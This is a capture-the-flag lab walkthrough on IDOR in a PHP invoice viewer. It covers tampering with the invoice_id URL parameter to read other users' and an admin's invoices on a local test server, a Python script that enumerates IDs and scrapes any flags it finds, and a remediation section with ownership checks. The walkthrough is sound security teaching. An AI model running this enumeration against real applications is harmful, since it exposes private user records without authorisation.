# Lab 04 Walkthrough: Insecure Direct Object References (IDOR)

Step-by-step guide to exploiting parameter tampering, broken object-level authorization, and vertical privilege escalation.

---

## 🎯 The Mission
You are logged in as a normal user, **`alice`**.
You can view your own invoices (`#101` and `#102`).
Your goal:
1. Identify the authorization flaw in the invoice viewer.
2. Access the confidential invoices of user `bob` (horizontal privilege escalation).
3. Access the top-secret executive invoice of `admin` (vertical privilege escalation) and extract:
   `FLAG{IDOR_ACCESS_CONTROL_LEAK_BILLIONAIRE}`.

---

## 🔍 Vulnerability Analysis
Look at lines 33–38 of `index.php`:
```php
if ($view_id !== null) {
    $view_id = (int)$view_id;
    // VULNERABILITY: Fetching directly by ID without verifying if $invoices[$view_id]['owner'] === $current_user
    if (isset($invoices[$view_id])) {
        $selected_invoice = $invoices[$view_id];
    }
}
```
The application checks if the document exists in the database, but **never checks whether the currently logged-in user owns that document!**

---

## 💥 Step-by-Step Exploitation

### 1. Inspecting the Parameter
When clicking "View Invoice" on your own bill, the browser URL is:
```text
http://127.0.0.1:8888/Lab_04_IDOR_and_Broken_Access/?invoice_id=101
```
Notice the `invoice_id` parameter is exposed directly in the URL query string.

### 2. Parameter Tampering (Horizontal Privilege Escalation)
Try changing the ID:
```text
http://127.0.0.1:8888/Lab_04_IDOR_and_Broken_Access/?invoice_id=201
```
The page now renders Bob Marley's invoice! You have violated confidentiality across user boundaries.

### 3. Fuzzing / High-Value Target Discovery (Vertical Privilege Escalation)
In enterprise applications, administrative or special records often occupy low IDs (`1`, `2`, `10`) or high round numbers (`999`, `1000`).

Try changing the ID to `999`:
```text
http://127.0.0.1:8888/Lab_04_IDOR_and_Broken_Access/?invoice_id=999
```
**Boom!** The screen displays:
```text
📄 Invoice Details (Document #999)
Title: TOP SECRET: Defense Contract & Acquisition
Owner: admin
Total: $5,000,000.00
Status: CONFIDENTIAL

🎉 IDOR Exploit Successful!
Flag: FLAG{IDOR_ACCESS_CONTROL_LEAK_BILLIONAIRE}
```

---

## 🤖 Automated IDOR Fuzzing with Python

```python
import requests

TARGET_URL = "http://127.0.0.1:8888/Lab_04_IDOR_and_Broken_Access/"

print("[*] Fuzzing invoice IDs 100 to 1000 for IDOR vulnerabilities...")
for inv_id in range(100, 1005):
    r = requests.get(TARGET_URL, params={'invoice_id': inv_id})
    if "Invoice Details (Document" in r.text:
        if "FLAG{" in r.text:
            print(f"[+] HIGH VALUE HIT on ID {inv_id}! Found Flag!")
            for line in r.text.split("\n"):
                if "FLAG{" in line:
                    print("    " + line.strip())
        else:
            print(f"[+] Found accessible invoice: ID {inv_id}")
```

---

## 🛡️ Remediation (How to Fix It)

Always enforce server-side ownership checks before returning data:

```php
// SECURE CODE:
$stmt = $db->prepare("SELECT * FROM invoices WHERE id = :id AND owner = :current_user");
$stmt->execute([
    ':id' => $view_id,
    ':current_user' => $_SESSION['user']
]);
$selected_invoice = $stmt->fetch();

if (!$selected_invoice) {
    http_response_code(403);
    die("Access Denied: You do not have permission to view this resource.");
}
```
Alternatively, use non-sequential, cryptographically unpredictable identifiers (UUIDv4) combined with access control checks.
